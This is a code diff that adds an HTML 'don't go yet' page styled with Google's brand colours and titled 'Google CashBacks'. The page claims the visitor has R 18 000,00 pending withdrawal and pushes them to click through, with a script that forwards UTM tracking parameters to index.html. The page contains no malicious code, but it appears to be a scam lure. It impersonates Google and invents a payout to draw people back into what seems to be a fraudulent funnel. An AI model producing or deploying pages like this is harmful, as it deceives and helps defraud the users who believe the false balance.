@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google CashBacks - Wait!</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;700&display=swap">
+    <style>
+        :root {
+            --google-blue: #4285F4;
+            --google-red: #EA4335;
+            --google-yellow: #FBBC05;
+            --google-green: #34A853;
+        }
+
+        body {
+            font-family: 'Outfit', sans-serif;
+            background-color: #f8f9fa;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            text-align: center;
+        }
+
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            max-width: 500px;
+            width: 90%;
+        }
+
+        h1 {
+            color: var(--google-red);
+            font-size: 2rem;
+            margin-bottom: 20px;
+        }
+
+        p {
+            color: #5f6368;
+            font-size: 1.1rem;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+
+        .btn-google {
+            background-color: var(--google-blue);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            border-radius: 50px;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            transition: transform 0.2s, background-color 0.2s;
+        }
+
+        .btn-google:hover {
+            background-color: #357ae8;
+            transform: scale(1.05);
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>WAIT! DON'T GO YET!</h1>
+        <p>You still have a balance of <strong>R 18 000,00</strong> pending withdrawal. Complete the process now to
+            receive your money.</p>
+        <a href="index.html" class="btn-google">CLICK HERE TO WITHDRAW NOW</a>
+    </div>
+
+    <script>
+        // Forward UTMs to index.html if clicked
+        document.querySelector('.btn-google').addEventListener('click', function (e) {
+            e.preventDefault();
+            window.location.href = "index.html" + window.location.search;
+        });
+    </script>
+</body>
+
+</html>
